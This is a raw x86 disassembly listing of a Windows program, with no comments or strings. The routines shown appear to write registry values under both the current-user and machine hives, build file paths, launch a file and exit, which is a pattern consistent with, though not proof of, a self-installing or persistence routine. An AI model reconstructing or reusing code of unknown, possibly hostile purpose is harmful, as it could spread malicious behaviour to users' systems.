  406b21:	8d 45 bc             	lea    -0x44(%ebp),%eax
  406b24:	50                   	push   %eax
  406b25:	e8 f6 90 00 00       	call   0x40fc20
  406b2a:	83 c4 0c             	add    $0xc,%esp
  406b2d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406b30:	ff 15 54 02 41 00    	call   *0x410254
  406b36:	be 68 06 41 00       	mov    $0x410668,%esi
  406b3b:	bf 18 59 41 00       	mov    $0x415918,%edi
  406b40:	56                   	push   %esi
  406b41:	57                   	push   %edi
  406b42:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  406b46:	ff 15 a4 02 41 00    	call   *0x4102a4
  406b4c:	8b 1d 60 01 41 00    	mov    0x410160,%ebx
  406b52:	59                   	pop    %ecx
  406b53:	84 c0                	test   %al,%al
  406b55:	59                   	pop    %ecx
  406b56:	74 13                	je     0x406b6b
  406b58:	68 80 00 00 00       	push   $0x80
  406b5d:	b9 18 59 41 00       	mov    $0x415918,%ecx
  406b62:	ff 15 58 02 41 00    	call   *0x410258
  406b68:	50                   	push   %eax
  406b69:	ff d3                	call   *%ebx
  406b6b:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  406b71:	68 80 00 00 00       	push   $0x80
  406b76:	50                   	push   %eax
  406b77:	ff d3                	call   *%ebx
  406b79:	85 c0                	test   %eax,%eax
  406b7b:	75 03                	jne    0x406b80
  406b7d:	20 45 ff             	and    %al,-0x1(%ebp)
  406b80:	6a 01                	push   $0x1
  406b82:	6a 10                	push   $0x10
  406b84:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  406b87:	ff 15 58 02 41 00    	call   *0x410258
  406b8d:	50                   	push   %eax
  406b8e:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  406b94:	ff 15 2c 02 41 00    	call   *0x41022c
  406b9a:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  406ba0:	ff 15 30 02 41 00    	call   *0x410230
  406ba6:	84 c0                	test   %al,%al
  406ba8:	0f 84 73 01 00 00    	je     0x406d21
  406bae:	8b 1d 1c 02 41 00    	mov    0x41021c,%ebx
  406bb4:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  406bba:	68 30 0f 41 00       	push   $0x410f30
  406bbf:	50                   	push   %eax
  406bc0:	ff d3                	call   *%ebx
  406bc2:	59                   	pop    %ecx
  406bc3:	8d 45 fe             	lea    -0x2(%ebp),%eax
  406bc6:	59                   	pop    %ecx
  406bc7:	68 2c 0f 41 00       	push   $0x410f2c
  406bcc:	50                   	push   %eax
  406bcd:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  406bd3:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406bd6:	50                   	push   %eax
  406bd7:	ff 15 4c 02 41 00    	call   *0x41024c
  406bdd:	50                   	push   %eax
  406bde:	8d 45 cc             	lea    -0x34(%ebp),%eax
  406be1:	68 24 0f 41 00       	push   $0x410f24
  406be6:	50                   	push   %eax
  406be7:	e8 2e 90 00 00       	call   0x40fc1a
  406bec:	83 c4 0c             	add    $0xc,%esp
  406bef:	50                   	push   %eax
  406bf0:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406bf3:	50                   	push   %eax
  406bf4:	e8 27 90 00 00       	call   0x40fc20
  406bf9:	50                   	push   %eax
  406bfa:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  406c00:	50                   	push   %eax
  406c01:	e8 44 90 00 00       	call   0x40fc4a
  406c06:	83 c4 14             	add    $0x14,%esp
  406c09:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406c0c:	ff 15 54 02 41 00    	call   *0x410254
  406c12:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  406c15:	ff 15 54 02 41 00    	call   *0x410254
  406c1b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406c1e:	ff 15 54 02 41 00    	call   *0x410254
  406c24:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  406c28:	74 60                	je     0x406c8a
  406c2a:	8d 45 fe             	lea    -0x2(%ebp),%eax
  406c2d:	68 14 0f 41 00       	push   $0x410f14
  406c32:	50                   	push   %eax
  406c33:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  406c39:	50                   	push   %eax
  406c3a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406c3d:	ff 15 4c 02 41 00    	call   *0x41024c
  406c43:	50                   	push   %eax
  406c44:	8d 45 cc             	lea    -0x34(%ebp),%eax
  406c47:	68 08 0f 41 00       	push   $0x410f08
  406c4c:	50                   	push   %eax
  406c4d:	e8 c8 8f 00 00       	call   0x40fc1a
  406c52:	83 c4 0c             	add    $0xc,%esp
  406c55:	50                   	push   %eax
  406c56:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406c59:	50                   	push   %eax
  406c5a:	e8 c1 8f 00 00       	call   0x40fc20
  406c5f:	50                   	push   %eax
  406c60:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  406c66:	50                   	push   %eax
  406c67:	e8 de 8f 00 00       	call   0x40fc4a
  406c6c:	83 c4 14             	add    $0x14,%esp
  406c6f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406c72:	ff 15 54 02 41 00    	call   *0x410254
  406c78:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  406c7b:	ff 15 54 02 41 00    	call   *0x410254
  406c81:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406c84:	ff 15 54 02 41 00    	call   *0x410254
  406c8a:	56                   	push   %esi
  406c8b:	57                   	push   %edi
  406c8c:	ff 15 a4 02 41 00    	call   *0x4102a4
  406c92:	59                   	pop    %ecx
  406c93:	84 c0                	test   %al,%al
  406c95:	59                   	pop    %ecx
  406c96:	74 43                	je     0x406cdb
  406c98:	68 2c 0f 41 00       	push   $0x410f2c
  406c9d:	57                   	push   %edi
  406c9e:	8d 45 cc             	lea    -0x34(%ebp),%eax
  406ca1:	68 fc 0e 41 00       	push   $0x410efc
  406ca6:	50                   	push   %eax
  406ca7:	e8 6e 8f 00 00       	call   0x40fc1a
  406cac:	83 c4 0c             	add    $0xc,%esp
  406caf:	50                   	push   %eax
  406cb0:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406cb3:	50                   	push   %eax
  406cb4:	e8 67 8f 00 00       	call   0x40fc20
  406cb9:	50                   	push   %eax
  406cba:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  406cc0:	50                   	push   %eax
  406cc1:	e8 84 8f 00 00       	call   0x40fc4a
  406cc6:	83 c4 14             	add    $0x14,%esp
  406cc9:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406ccc:	ff 15 54 02 41 00    	call   *0x410254
  406cd2:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  406cd5:	ff 15 54 02 41 00    	call   *0x410254
  406cdb:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  406ce1:	68 a8 0e 41 00       	push   $0x410ea8
  406ce6:	50                   	push   %eax
  406ce7:	ff d3                	call   *%ebx
  406ce9:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  406cef:	68 a0 0e 41 00       	push   $0x410ea0
  406cf4:	50                   	push   %eax
  406cf5:	ff d3                	call   *%ebx
  406cf7:	83 c4 10             	add    $0x10,%esp
  406cfa:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  406d00:	ff 15 fc 02 41 00    	call   *0x4102fc
  406d06:	6a 00                	push   $0x0
  406d08:	56                   	push   %esi
  406d09:	56                   	push   %esi
  406d0a:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  406d0d:	ff 15 58 02 41 00    	call   *0x410258
  406d13:	50                   	push   %eax
  406d14:	68 18 07 41 00       	push   $0x410718
  406d19:	6a 00                	push   $0x0
  406d1b:	ff 15 bc 03 41 00    	call   *0x4103bc
  406d21:	6a 00                	push   $0x0
  406d23:	ff 15 ac 03 41 00    	call   *0x4103ac
  406d29:	55                   	push   %ebp
  406d2a:	8b ec                	mov    %esp,%ebp
  406d2c:	81 ec d4 01 00 00    	sub    $0x1d4,%esp
  406d32:	80 3d f8 56 41 00 01 	cmpb   $0x1,0x4156f8
  406d39:	53                   	push   %ebx
  406d3a:	56                   	push   %esi
  406d3b:	57                   	push   %edi
  406d3c:	75 0a                	jne    0x406d48
  406d3e:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  406d43:	e8 06 e5 ff ff       	call   0x40524e
  406d48:	80 3d 64 5b 41 00 01 	cmpb   $0x1,0x415b64
  406d4f:	75 05                	jne    0x406d56
  406d51:	e8 55 77 00 00       	call   0x40e4ab
  406d56:	80 3d 08 58 41 00 01 	cmpb   $0x1,0x415808
  406d5d:	bb f8 57 41 00       	mov    $0x4157f8,%ebx
  406d62:	bf 70 0e 41 00       	mov    $0x410e70,%edi
  406d67:	75 17                	jne    0x406d80
  406d69:	8b cb                	mov    %ebx,%ecx
  406d6b:	ff 15 58 02 41 00    	call   *0x410258
  406d71:	50                   	push   %eax
  406d72:	57                   	push   %edi
  406d73:	68 01 00 00 80       	push   $0x80000001
  406d78:	e8 b5 23 00 00       	call   0x409132
  406d7d:	83 c4 0c             	add    $0xc,%esp
  406d80:	80 3d 11 59 41 00 01 	cmpb   $0x1,0x415911
  406d87:	be 02 00 00 80       	mov    $0x80000002,%esi
  406d8c:	75 13                	jne    0x406da1
  406d8e:	8b cb                	mov    %ebx,%ecx
  406d90:	ff 15 58 02 41 00    	call   *0x410258
  406d96:	50                   	push   %eax
  406d97:	57                   	push   %edi
  406d98:	56                   	push   %esi
  406d99:	e8 94 23 00 00       	call   0x409132
  406d9e:	83 c4 0c             	add    $0xc,%esp
  406da1:	80 3d 10 59 41 00 01 	cmpb   $0x1,0x415910
  406da8:	bf 20 0e 41 00       	mov    $0x410e20,%edi
  406dad:	75 25                	jne    0x406dd4
  406daf:	6a 01                	push   $0x1
  406db1:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406db4:	83 ec 10             	sub    $0x10,%esp
  406db7:	8b cc                	mov    %esp,%ecx
  406db9:	50                   	push   %eax
  406dba:	68 78 0f 41 00       	push   $0x410f78
  406dbf:	ff 15 4c 02 41 00    	call   *0x41024c
  406dc5:	68 58 0e 41 00       	push   $0x410e58
  406dca:	57                   	push   %edi
  406dcb:	56                   	push   %esi
  406dcc:	e8 09 22 00 00       	call   0x408fda
  406dd1:	83 c4 20             	add    $0x20,%esp
  406dd4:	80 3d e0 57 41 00 01 	cmpb   $0x1,0x4157e0
  406ddb:	75 25                	jne    0x406e02
  406ddd:	6a 01                	push   $0x1
  406ddf:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406de2:	83 ec 10             	sub    $0x10,%esp
  406de5:	8b cc                	mov    %esp,%ecx
  406de7:	50                   	push   %eax
  406de8:	68 54 0f 41 00       	push   $0x410f54
  406ded:	ff 15 4c 02 41 00    	call   *0x41024c
  406df3:	68 f0 0d 41 00       	push   $0x410df0
  406df8:	57                   	push   %edi
  406df9:	56                   	push   %esi
  406dfa:	e8 db 21 00 00       	call   0x408fda
  406dff:	83 c4 20             	add    $0x20,%esp
  406e02:	80 3d c8 57 41 00 01 	cmpb   $0x1,0x4157c8
  406e09:	75 17                	jne    0x406e22
  406e0b:	8b cb                	mov    %ebx,%ecx
  406e0d:	ff 15 58 02 41 00    	call   *0x410258
  406e13:	50                   	push   %eax
  406e14:	68 ac 0d 41 00       	push   $0x410dac
  406e19:	56                   	push   %esi
  406e1a:	e8 13 23 00 00       	call   0x409132
  406e1f:	83 c4 0c             	add    $0xc,%esp
  406e22:	be 50 59 41 00       	mov    $0x415950,%esi
  406e27:	8b ce                	mov    %esi,%ecx
  406e29:	ff 15 90 02 41 00    	call   *0x410290
  406e2f:	50                   	push   %eax
  406e30:	8b ce                	mov    %esi,%ecx
  406e32:	ff 15 58 02 41 00    	call   *0x410258
  406e38:	50                   	push   %eax
  406e39:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  406e3f:	be e8 57 41 00       	mov    $0x4157e8,%esi
  406e44:	50                   	push   %eax
  406e45:	68 4c 0f 41 00       	push   $0x410f4c
  406e4a:	8b ce                	mov    %esi,%ecx
  406e4c:	ff 15 58 02 41 00    	call   *0x410258
  406e52:	bf 01 00 00 80       	mov    $0x80000001,%edi
  406e57:	50                   	push   %eax
  406e58:	57                   	push   %edi
  406e59:	e8 06 21 00 00       	call   0x408f64
  406e5e:	83 c4 18             	add    $0x18,%esp
  406e61:	84 c0                	test   %al,%al
  406e63:	75 16                	jne    0x406e7b
  406e65:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  406e6b:	68 04 01 00 00       	push   $0x104
  406e70:	50                   	push   %eax
  406e71:	6a 00                	push   $0x0
  406e73:	ff 15 6c 00 41 00    	call   *0x41006c
  406e79:	eb 10                	jmp    0x406e8b
  406e7b:	8b ce                	mov    %esi,%ecx
  406e7d:	ff 15 58 02 41 00    	call   *0x410258
  406e83:	50                   	push   %eax
  406e84:	57                   	push   %edi
  406e85:	ff 15 2c 00 41 00    	call   *0x41002c
  406e8b:	8b 35 60 01 41 00    	mov    0x410160,%esi
  406e91:	bf 80 00 00 00       	mov    $0x80,%edi
  406e96:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  406e9c:	57                   	push   %edi
  406e9d:	50                   	push   %eax
  406e9e:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  406ea2:	ff d6                	call   *%esi
  406ea4:	85 c0                	test   %eax,%eax
  406ea6:	75 03                	jne    0x406eab
  406ea8:	20 45 ff             	and    %al,-0x1(%ebp)
  406eab:	bb 18 59 41 00       	mov    $0x415918,%ebx
  406eb0:	68 68 06 41 00       	push   $0x410668
  406eb5:	53                   	push   %ebx
  406eb6:	ff 15 a4 02 41 00    	call   *0x4102a4
  406ebc:	59                   	pop    %ecx
  406ebd:	84 c0                	test   %al,%al
  406ebf:	59                   	pop    %ecx
  406ec0:	74 0f                	je     0x406ed1
  406ec2:	57                   	push   %edi
  406ec3:	b9 18 59 41 00       	mov    $0x415918,%ecx
  406ec8:	ff 15 58 02 41 00    	call   *0x410258
  406ece:	50                   	push   %eax
  406ecf:	ff d6                	call   *%esi
  406ed1:	68 88 0f 41 00       	push   $0x410f88
  406ed6:	8d 45 fe             	lea    -0x2(%ebp),%eax
  406ed9:	68 cc 08 41 00       	push   $0x4108cc
  406ede:	50                   	push   %eax
  406edf:	68 e4 0e 41 00       	push   $0x410ee4
  406ee4:	ff 15 64 03 41 00    	call   *0x410364
  406eea:	59                   	pop    %ecx
  406eeb:	50                   	push   %eax
  406eec:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406eef:	ff 15 4c 02 41 00    	call   *0x41024c
  406ef5:	50                   	push   %eax
  406ef6:	8d 45 cc             	lea    -0x34(%ebp),%eax
  406ef9:	50                   	push   %eax
  406efa:	e8 21 8d 00 00       	call   0x40fc20
  406eff:	83 c4 0c             	add    $0xc,%esp
  406f02:	50                   	push   %eax
  406f03:	8d 45 bc             	lea    -0x44(%ebp),%eax
  406f06:	50                   	push   %eax
  406f07:	e8 14 8d 00 00       	call   0x40fc20
  406f0c:	83 c4 0c             	add    $0xc,%esp
  406f0f:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  406f12:	ff 15 54 02 41 00    	call   *0x410254
  406f18:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406f1b:	ff 15 54 02 41 00    	call   *0x410254
  406f21:	6a 01                	push   $0x1
  406f23:	6a 12                	push   $0x12
  406f25:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  406f28:	ff 15 58 02 41 00    	call   *0x410258
  406f2e:	50                   	push   %eax
  406f2f:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  406f35:	ff 15 2c 02 41 00    	call   *0x41022c
  406f3b:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  406f41:	ff 15 30 02 41 00    	call   *0x410230
  406f47:	84 c0                	test   %al,%al
  406f49:	0f 84 bd 01 00 00    	je     0x40710c
  406f4f:	8b 35 1c 02 41 00    	mov    0x41021c,%esi
  406f55:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  406f5b:	68 30 0f 41 00       	push   $0x410f30
  406f60:	50                   	push   %eax
  406f61:	ff d6                	call   *%esi
  406f63:	59                   	pop    %ecx
  406f64:	bf 2c 0f 41 00       	mov    $0x410f2c,%edi
  406f69:	59                   	pop    %ecx
  406f6a:	8d 45 fe             	lea    -0x2(%ebp),%eax
  406f6d:	57                   	push   %edi
  406f6e:	50                   	push   %eax
  406f6f:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  406f75:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406f78:	50                   	push   %eax
  406f79:	ff 15 4c 02 41 00    	call   *0x41024c
  406f7f:	50                   	push   %eax
  406f80:	8d 45 cc             	lea    -0x34(%ebp),%eax
  406f83:	68 24 0f 41 00       	push   $0x410f24
  406f88:	50                   	push   %eax
  406f89:	e8 8c 8c 00 00       	call   0x40fc1a
  406f8e:	83 c4 0c             	add    $0xc,%esp
  406f91:	50                   	push   %eax
  406f92:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406f95:	50                   	push   %eax
  406f96:	e8 85 8c 00 00       	call   0x40fc20
  406f9b:	50                   	push   %eax
  406f9c:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  406fa2:	50                   	push   %eax
  406fa3:	e8 a2 8c 00 00       	call   0x40fc4a
  406fa8:	83 c4 14             	add    $0x14,%esp
  406fab:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406fae:	ff 15 54 02 41 00    	call   *0x410254
  406fb4:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  406fb7:	ff 15 54 02 41 00    	call   *0x410254
  406fbd:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406fc0:	ff 15 54 02 41 00    	call   *0x410254
  406fc6:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  406fca:	74 60                	je     0x40702c
  406fcc:	8d 45 fe             	lea    -0x2(%ebp),%eax
  406fcf:	68 14 0f 41 00       	push   $0x410f14
  406fd4:	50                   	push   %eax
  406fd5:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  406fdb:	50                   	push   %eax
  406fdc:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  406fdf:	ff 15 4c 02 41 00    	call   *0x41024c
  406fe5:	50                   	push   %eax
  406fe6:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406fe9:	68 08 0f 41 00       	push   $0x410f08
  406fee:	50                   	push   %eax
  406fef:	e8 26 8c 00 00       	call   0x40fc1a
  406ff4:	83 c4 0c             	add    $0xc,%esp
  406ff7:	50                   	push   %eax
  406ff8:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406ffb:	50                   	push   %eax
  406ffc:	e8 1f 8c 00 00       	call   0x40fc20
  407001:	50                   	push   %eax
  407002:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  407008:	50                   	push   %eax
  407009:	e8 3c 8c 00 00       	call   0x40fc4a
  40700e:	83 c4 14             	add    $0x14,%esp
  407011:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407014:	ff 15 54 02 41 00    	call   *0x410254
  40701a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40701d:	ff 15 54 02 41 00    	call   *0x410254
  407023:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  407026:	ff 15 54 02 41 00    	call   *0x410254
  40702c:	68 68 06 41 00       	push   $0x410668
  407031:	53                   	push   %ebx
  407032:	ff 15 a4 02 41 00    	call   *0x4102a4
  407038:	59                   	pop    %ecx
  407039:	84 c0                	test   %al,%al
  40703b:	59                   	pop    %ecx
  40703c:	74 3f                	je     0x40707d
  40703e:	57                   	push   %edi
  40703f:	53                   	push   %ebx
  407040:	8d 45 ec             	lea    -0x14(%ebp),%eax
  407043:	68 fc 0e 41 00       	push   $0x410efc
  407048:	50                   	push   %eax
  407049:	e8 cc 8b 00 00       	call   0x40fc1a
  40704e:	83 c4 0c             	add    $0xc,%esp
  407051:	50                   	push   %eax
  407052:	8d 45 dc             	lea    -0x24(%ebp),%eax
  407055:	50                   	push   %eax
  407056:	e8 c5 8b 00 00       	call   0x40fc20
  40705b:	50                   	push   %eax
  40705c:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  407062:	50                   	push   %eax
  407063:	e8 e2 8b 00 00       	call   0x40fc4a
  407068:	83 c4 14             	add    $0x14,%esp
  40706b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40706e:	ff 15 54 02 41 00    	call   *0x410254
  407074:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  407077:	ff 15 54 02 41 00    	call   *0x410254
  40707d:	8d 45 08             	lea    0x8(%ebp),%eax
  407080:	57                   	push   %edi
  407081:	50                   	push   %eax
  407082:	8d 45 ec             	lea    -0x14(%ebp),%eax
  407085:	68 60 08 41 00       	push   $0x410860
  40708a:	50                   	push   %eax
  40708b:	e8 8a 8b 00 00       	call   0x40fc1a
  407090:	83 c4 0c             	add    $0xc,%esp
  407093:	50                   	push   %eax
  407094:	8d 45 dc             	lea    -0x24(%ebp),%eax
  407097:	50                   	push   %eax
  407098:	e8 83 8b 00 00       	call   0x40fc20
  40709d:	50                   	push   %eax
  40709e:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  4070a4:	50                   	push   %eax
  4070a5:	e8 a0 8b 00 00       	call   0x40fc4a
  4070aa:	83 c4 14             	add    $0x14,%esp
  4070ad:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4070b0:	ff 15 54 02 41 00    	call   *0x410254
  4070b6:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4070b9:	ff 15 54 02 41 00    	call   *0x410254
  4070bf:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  4070c5:	68 a8 0e 41 00       	push   $0x410ea8
  4070ca:	50                   	push   %eax
  4070cb:	ff d6                	call   *%esi
  4070cd:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  4070d3:	68 a0 0e 41 00       	push   $0x410ea0
  4070d8:	50                   	push   %eax
  4070d9:	ff d6                	call   *%esi
  4070db:	83 c4 10             	add    $0x10,%esp
  4070de:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  4070e4:	ff 15 fc 02 41 00    	call   *0x4102fc
  4070ea:	33 f6                	xor    %esi,%esi
  4070ec:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4070ef:	56                   	push   %esi
  4070f0:	56                   	push   %esi
  4070f1:	56                   	push   %esi
  4070f2:	ff 15 58 02 41 00    	call   *0x410258
  4070f8:	50                   	push   %eax
  4070f9:	68 18 07 41 00       	push   $0x410718
  4070fe:	56                   	push   %esi
  4070ff:	ff 15 bc 03 41 00    	call   *0x4103bc
  407105:	56                   	push   %esi
  407106:	ff 15 ac 03 41 00    	call   *0x4103ac
  40710c:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  407112:	ff 15 f8 02 41 00    	call   *0x4102f8
  407118:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40711b:	ff 15 54 02 41 00    	call   *0x410254
  407121:	8d 4d 08             	lea    0x8(%ebp),%ecx
  407124:	ff 15 54 02 41 00    	call   *0x410254
  40712a:	5f                   	pop    %edi
  40712b:	5e                   	pop    %esi
  40712c:	5b                   	pop    %ebx
  40712d:	c9                   	leave
  40712e:	c3                   	ret
  40712f:	55                   	push   %ebp
  407130:	8b ec                	mov    %esp,%ebp
  407132:	81 ec 88 01 00 00    	sub    $0x188,%esp
  407138:	8d 45 fe             	lea    -0x2(%ebp),%eax
  40713b:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40713e:	50                   	push   %eax
  40713f:	ff 15 50 02 41 00    	call   *0x410250
  407145:	0f be 45 0c          	movsbl 0xc(%ebp),%eax
  407149:	83 c0 d0             	add    $0xffffffd0,%eax
  40714c:	83 f8 07             	cmp    $0x7,%eax
  40714f:	0f 87 2d 01 00 00    	ja     0x407282
  407155:	ff 24 85 26 73 40 00 	jmp    *0x407326(,%eax,4)
  40715c:	68 e4 0e 41 00       	push   $0x410ee4
  407161:	e9 0b 01 00 00       	jmp    0x407271
  407166:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40716c:	50                   	push   %eax
  40716d:	e8 74 73 00 00       	call   0x40e4e6
  407172:	59                   	pop    %ecx
  407173:	50                   	push   %eax
  407174:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  407177:	ff 15 64 02 41 00    	call   *0x410264
  40717d:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  407183:	eb 76                	jmp    0x4071fb
  407185:	68 cc 0f 41 00       	push   $0x410fcc
  40718a:	e9 e2 00 00 00       	jmp    0x407271
  40718f:	68 c4 0f 41 00       	push   $0x410fc4
  407194:	e9 d8 00 00 00       	jmp    0x407271
  407199:	e8 17 7f 00 00       	call   0x40f0b5
  40719e:	84 c0                	test   %al,%al
  4071a0:	75 61                	jne    0x407203
  4071a2:	8d 45 0f             	lea    0xf(%ebp),%eax
  4071a5:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4071a8:	50                   	push   %eax
  4071a9:	68 b8 0f 41 00       	push   $0x410fb8
  4071ae:	ff 15 4c 02 41 00    	call   *0x41024c
  4071b4:	50                   	push   %eax
  4071b5:	8d 45 fe             	lea    -0x2(%ebp),%eax
  4071b8:	50                   	push   %eax
  4071b9:	68 c4 0f 41 00       	push   $0x410fc4
  4071be:	ff 15 64 03 41 00    	call   *0x410364
  4071c4:	59                   	pop    %ecx
  4071c5:	50                   	push   %eax
  4071c6:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  4071c9:	ff 15 4c 02 41 00    	call   *0x41024c
  4071cf:	50                   	push   %eax
  4071d0:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4071d3:	50                   	push   %eax
  4071d4:	e8 3b 8a 00 00       	call   0x40fc14
  4071d9:	83 c4 0c             	add    $0xc,%esp
  4071dc:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4071df:	50                   	push   %eax
  4071e0:	ff 15 64 02 41 00    	call   *0x410264
  4071e6:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  4071e9:	ff 15 54 02 41 00    	call   *0x410254
  4071ef:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  4071f2:	ff 15 54 02 41 00    	call   *0x410254
  4071f8:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4071fb:	ff 15 54 02 41 00    	call   *0x410254
  407201:	eb 7f                	jmp    0x407282
  407203:	8d 45 fd             	lea    -0x3(%ebp),%eax
  407206:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  407209:	50                   	push   %eax
  40720a:	68 ac 0f 41 00       	push   $0x410fac
  40720f:	ff 15 4c 02 41 00    	call   *0x41024c
  407215:	50                   	push   %eax
  407216:	8d 45 ff             	lea    -0x1(%ebp),%eax
  407219:	50                   	push   %eax
  40721a:	68 c4 0f 41 00       	push   $0x410fc4
  40721f:	ff 15 64 03 41 00    	call   *0x410364
  407225:	59                   	pop    %ecx
  407226:	50                   	push   %eax
  407227:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40722a:	ff 15 4c 02 41 00    	call   *0x41024c
  407230:	50                   	push   %eax
  407231:	8d 45 cc             	lea    -0x34(%ebp),%eax
  407234:	50                   	push   %eax
  407235:	e8 da 89 00 00       	call   0x40fc14
  40723a:	83 c4 0c             	add    $0xc,%esp
  40723d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  407240:	50                   	push   %eax
  407241:	ff 15 64 02 41 00    	call   *0x410264
  407247:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40724a:	ff 15 54 02 41 00    	call   *0x410254
  407250:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  407253:	ff 15 54 02 41 00    	call   *0x410254
  407259:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40725c:	eb 9d                	jmp    0x4071fb
  40725e:	68 9c 0f 41 00       	push   $0x410f9c
  407263:	eb 0c                	jmp    0x407271
  407265:	68 94 0f 41 00       	push   $0x410f94
  40726a:	eb 05                	jmp    0x407271
  40726c:	68 1c 0b 41 00       	push   $0x410b1c
  407271:	ff 15 64 03 41 00    	call   *0x410364
  407277:	59                   	pop    %ecx
  407278:	50                   	push   %eax
  407279:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40727c:	ff 15 d8 02 41 00    	call   *0x4102d8
  407282:	56                   	push   %esi
  407283:	8d 85 78 fe ff ff    	lea    -0x188(%ebp),%eax
  407289:	68 04 01 00 00       	push   $0x104
  40728e:	50                   	push   %eax
  40728f:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  407292:	ff 15 58 02 41 00    	call   *0x410258
  407298:	50                   	push   %eax
  407299:	ff 15 70 00 41 00    	call   *0x410070
  40729f:	8b f0                	mov    %eax,%esi
  4072a1:	8d 45 0f             	lea    0xf(%ebp),%eax
  4072a4:	50                   	push   %eax
  4072a5:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4072a8:	ff 75 10             	push   0x10(%ebp)
  4072ab:	ff 15 4c 02 41 00    	call   *0x41024c
  4072b1:	50                   	push   %eax
  4072b2:	8d 45 13             	lea    0x13(%ebp),%eax
  4072b5:	50                   	push   %eax
  4072b6:	68 cc 08 41 00       	push   $0x4108cc
  4072bb:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4072be:	ff 15 4c 02 41 00    	call   *0x41024c
